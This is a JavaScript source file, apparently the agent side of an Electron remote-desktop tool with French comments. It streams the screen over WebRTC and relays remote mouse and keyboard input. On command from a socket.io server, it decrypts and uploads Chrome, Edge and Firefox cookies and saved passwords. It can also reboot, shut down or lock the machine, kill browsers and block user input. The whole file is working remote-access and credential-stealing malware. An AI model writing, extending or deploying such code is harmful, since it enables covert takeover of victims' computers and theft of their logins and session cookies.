const { ipcRenderer } = require('electron');
const io = require('socket.io-client');
const { SERVER_URL } = require('../config');
const fs   = require('fs');
const os   = require('os');
const path = require('path');
const crypto = require('crypto');
const { execSync } = require('child_process');

// ── Déchiffrement Chrome/Edge ──

async function initSQL() {
  const initSqlJs = require('sql.js');
  const wasmPath = path.join(__dirname, '..', 'node_modules', 'sql.js', 'dist', 'sql-wasm.wasm');
  const wasmBinary = fs.readFileSync(wasmPath);
  return initSqlJs({ wasmBinary });
}

function dpapi(encBuf) {
  const b64 = encBuf.toString('base64');
  const script = `Add-Type -AssemblyName System.Security;[Convert]::ToBase64String([System.Security.Cryptography.ProtectedData]::Unprotect([Convert]::FromBase64String('${b64}'),$null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser))`;
  try {
    const out = execSync(`powershell -NoProfile -Command "${script}"`, { timeout: 8000 }).toString().trim();
    return Buffer.from(out, 'base64');
  } catch (e) {
    return null;
  }
}

function getMasterKey(browserBase) {
  try {
    const ls = JSON.parse(fs.readFileSync(path.join(browserBase, 'Local State'), 'utf8'));
    const encKeyB64 = ls?.os_crypt?.encrypted_key;
    if (!encKeyB64) return null;
    const encKey = Buffer.from(encKeyB64, 'base64').slice(5); // retirer préfixe "DPAPI"
    return dpapi(encKey);
  } catch { return null; }
}

function decryptValue(encBuf, masterKey) {
  try {
    if (!encBuf || encBuf.length < 3) return '';
    const prefix = encBuf.slice(0, 3).toString('ascii');
    if ((prefix === 'v10' || prefix === 'v11') && masterKey) {
      const iv = encBuf.slice(3, 15);
      const tag = encBuf.slice(-16);
      const ct  = encBuf.slice(15, -16);
      const d   = crypto.createDecipheriv('aes-256-gcm', masterKey, iv);
      d.setAuthTag(tag);
      return d.update(ct, null, 'utf8') + d.final('utf8');
    }
    // Ancien format (DPAPI direct sur la valeur)
    const dec = dpapi(encBuf);
    return dec ? dec.toString('utf8') : '(non déchiffrable)';
  } catch (e) {
    return `(err: ${e.message.slice(0, 40)})`;
  }
}

function openDb(SQL, filePath) {
  const tmp = path.join(os.tmpdir(), `tmp_${Date.now()}_${Math.random().toString(36).slice(2)}.db`);
  fs.copyFileSync(filePath, tmp);
  try {
    const db = new SQL.Database(fs.readFileSync(tmp));
    return db;
  } finally {
    try { fs.unlinkSync(tmp); } catch {}
  }
}

async function extractCookies() {
  const SQL = await initSQL();
  const browsers = [
    { name: 'Chrome', base: `${process.env.LOCALAPPDATA}\\Google\\Chrome\\User Data`,  db: 'Default\\Network\\Cookies' },
    { name: 'Edge',   base: `${process.env.LOCALAPPDATA}\\Microsoft\\Edge\\User Data`, db: 'Default\\Network\\Cookies' },
    { name: 'Firefox',base: null, db: null }
  ];

  const results = {};

  for (const b of browsers) {
    try {
      if (b.name === 'Firefox') {
        // Firefox: cookies en clair
        const profileDir = `${process.env.APPDATA}\\Mozilla\\Firefox\\Profiles`;
        if (!fs.existsSync(profileDir)) { results.Firefox = 'Non installé'; continue; }
        const profile = fs.readdirSync(profileDir).find(d => d.endsWith('.default-release') || d.endsWith('.default'));
        if (!profile) { results.Firefox = 'Profil introuvable'; continue; }
        const dbPath = path.join(profileDir, profile, 'cookies.sqlite');
        if (!fs.existsSync(dbPath)) { results.Firefox = 'Pas de cookies'; continue; }
        const db = openDb(SQL, dbPath);
        const res = db.exec('SELECT host, name, value FROM moz_cookies LIMIT 300');
        db.close();
        if (!res.length) { results.Firefox = 'Vide'; continue; }
        results.Firefox = res[0].values.map(([h, n, v]) => `${h} | ${n} | ${v}`).join('\n');
        continue;
      }

      if (!fs.existsSync(b.base)) { results[b.name] = 'Non installé'; continue; }
      const dbPath = path.join(b.base, b.db);
      if (!fs.existsSync(dbPath)) { results[b.name] = 'Pas de cookies'; continue; }

      const masterKey = getMasterKey(b.base);
      const db = openDb(SQL, dbPath);
      const res = db.exec('SELECT host_key, name, encrypted_value FROM cookies LIMIT 300');
      db.close();

      if (!res.length) { results[b.name] = 'Vide'; continue; }
      results[b.name] = res[0].values.map(([host, name, encVal]) => {
        const val = decryptValue(Buffer.from(encVal), masterKey);
        return `${host} | ${name} | ${val}`;
      }).join('\n');
    } catch (e) {
      results[b.name] = `Erreur: ${e.message}`;
    }
  }
  return results;
}

async function extractPasswords() {
  const SQL = await initSQL();
  const browsers = [
    { name: 'Chrome', base: `${process.env.LOCALAPPDATA}\\Google\\Chrome\\User Data`,  db: 'Default\\Login Data' },
    { name: 'Edge',   base: `${process.env.LOCALAPPDATA}\\Microsoft\\Edge\\User Data`, db: 'Default\\Login Data' },
  ];

  const results = {};

  for (const b of browsers) {
    try {
      if (!fs.existsSync(b.base)) { results[b.name] = 'Non installé'; continue; }
      const dbPath = path.join(b.base, b.db);
      if (!fs.existsSync(dbPath)) { results[b.name] = 'Pas de données'; continue; }

      const masterKey = getMasterKey(b.base);
      if (!masterKey) { results[b.name] = 'Clé DPAPI introuvable'; continue; }

      const db = openDb(SQL, dbPath);
      const res = db.exec('SELECT origin_url, username_value, password_value FROM logins WHERE username_value != ""');
      db.close();

      if (!res.length) { results[b.name] = 'Aucun mot de passe'; continue; }
      results[b.name] = res[0].values.map(([url, user, encPwd]) => {
        const pwd = decryptValue(Buffer.from(encPwd), masterKey);
        return `🌐 ${url}\n   👤 ${user}\n   🔑 ${pwd}`;
      }).join('\n\n');
    } catch (e) {
      results[b.name] = `Erreur: ${e.message}`;
    }
  }
  return results;
}

const RTC_CONFIG = {
  iceServers: [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
    { urls: 'stun:stun2.l.google.com:19302' }
  ]
};

let socket;
let peerConnections = {}; // controllerId → RTCPeerConnection
let screenStream = null;

function updateStatus(text) {
  const controllers = Object.keys(peerConnections).length;
  ipcRenderer.send('status-update', { text, controllers });
}

// ── Capture d'écran ──
async function getScreenStream() {
  const sources = await ipcRenderer.invoke('get-screen-sources');
  if (!sources || sources.length === 0) throw new Error('Aucun écran trouvé');

  const source = sources[0];
  return await navigator.mediaDevices.getUserMedia({
    audio: false,
    video: {
      mandatory: {
        chromeMediaSource: 'desktop',
        chromeMediaSourceId: source.id,
        maxWidth: 1920,
        maxHeight: 1080,
        maxFrameRate: 15
      }
    }
  });
}

// ── Connexion WebRTC avec un controller ──
async function createPeerConnection(controllerId) {
  if (!screenStream) {
    screenStream = await getScreenStream();
  }

  const pc = new RTCPeerConnection(RTC_CONFIG);
  peerConnections[controllerId] = pc;

  screenStream.getTracks().forEach(track => pc.addTrack(track, screenStream));

  pc.onicecandidate = ({ candidate }) => {
    if (candidate) {
      socket.emit('signal', { to: controllerId, signal: { type: 'ice', candidate } });
    }
  };

  pc.onconnectionstatechange = () => {
    const state = pc.connectionState;
    const count = Object.keys(peerConnections).length;

    if (state === 'connected') {
      updateStatus(count > 1 ? `${count} contrôleurs connectés` : 'Contrôlé');
    } else if (['disconnected', 'failed', 'closed'].includes(state)) {
      delete peerConnections[controllerId];
      const remaining = Object.keys(peerConnections).length;
      updateStatus(remaining > 0 ? `${remaining} contrôleur(s)` : 'En attente');
    }
  };

  const offer = await pc.createOffer({ offerToReceiveAudio: false, offerToReceiveVideo: false });
  await pc.setLocalDescription(offer);
  socket.emit('signal', { to: controllerId, signal: { type: 'offer', sdp: offer } });

  return pc;
}

// ── Socket.io ──
// ── Commandes macro + info ──
socket_on_command = async (cmd) => {
  if (cmd === 'get-info') {
    const info = await ipcRenderer.invoke('get-system-info');
    socket.emit('command:result', { cmd, data: info });
  } else if (cmd === 'get-cookies') {
    const result = await extractCookies();
    socket.emit('command:result', { cmd, data: result });
  } else if (cmd === 'get-passwords') {
    const result = await extractPasswords();
    socket.emit('command:result', { cmd, data: result });
  } else if (cmd === 'reboot') {
    require('child_process').exec('shutdown /r /t 5');
    socket.emit('command:result', { cmd, data: 'Redémarrage dans 5s' });
  } else if (cmd === 'shutdown') {
    require('child_process').exec('shutdown /s /t 5');
    socket.emit('command:result', { cmd, data: 'Extinction dans 5s' });
  } else if (cmd === 'lock') {
    require('child_process').exec('rundll32.exe user32.dll,LockWorkStation');
    socket.emit('command:result', { cmd, data: 'Poste verrouillé' });
  } else if (cmd === 'kill-browser') {
    require('child_process').exec('taskkill /F /IM chrome.exe /IM firefox.exe /IM msedge.exe 2>nul');
    socket.emit('command:result', { cmd, data: 'Navigateur fermé' });
  } else if (cmd === 'open-taskmgr') {
    require('child_process').exec('taskmgr');
    socket.emit('command:result', { cmd, data: 'Gestionnaire ouvert' });
  } else if (cmd === 'block-input') {
    require('child_process').exec(`powershell -NoProfile -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class B{[DllImport(\\"user32.dll\\")]public static extern bool BlockInput(bool b);}';[B]::BlockInput($true)"`, () => {});
    socket.emit('command:result', { cmd, data: 'Souris/clavier bloqués' });
  } else if (cmd === 'unblock-input') {
    require('child_process').exec(`powershell -NoProfile -Command "Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class B{[DllImport(\\"user32.dll\\")]public static extern bool BlockInput(bool b);}';[B]::BlockInput($false)"`, () => {});
    socket.emit('command:result', { cmd, data: 'Souris/clavier débloqués' });
  } else if (cmd === 'screenshot-info') {
    const info = await ipcRenderer.invoke('get-screen-size');
    socket.emit('command:result', { cmd, data: info });
  }
};

async function connect() {
  const hostname = await ipcRenderer.invoke('get-hostname');

  updateStatus('Connexion au serveur...');

  socket = io(SERVER_URL, {
    reconnectionDelay: 2000,
    reconnectionDelayMax: 10000,
    timeout: 10000
  });

  socket.on('connect', () => {
    socket.emit('agent:register', { name: hostname });
  });

  socket.on('agent:registered', () => {
    updateStatus('En attente de connexion');
  });

  socket.on('controller:joined', async (controllerId) => {
    updateStatus('Établissement WebRTC...');
    try {
      await createPeerConnection(controllerId);
    } catch (err) {
      updateStatus(`Erreur: ${err.message}`);
    }
  });

  socket.on('signal', async ({ from, signal }) => {
    const pc = peerConnections[from];
    if (!pc) return;

    if (signal.type === 'answer') {
      await pc.setRemoteDescription(new RTCSessionDescription(signal.sdp));
    } else if (signal.type === 'ice' && signal.candidate) {
      await pc.addIceCandidate(new RTCIceCandidate(signal.candidate)).catch(() => {});
    }
  });

  socket.on('input', (event) => {
    ipcRenderer.send('execute-input', event);
  });

  socket.on('command', (cmd) => { socket_on_command(cmd); });

  socket.on('controller:left', (controllerId) => {
    const pc = peerConnections[controllerId];
    if (pc) { pc.close(); delete peerConnections[controllerId]; }
    const remaining = Object.keys(peerConnections).length;
    updateStatus(remaining > 0 ? `${remaining} contrôleur(s)` : 'En attente');
  });

  socket.on('disconnect', () => updateStatus('Déconnecté — reconnexion...'));
  socket.on('connect_error', () => updateStatus('Serveur inaccessible'));
}

connect();
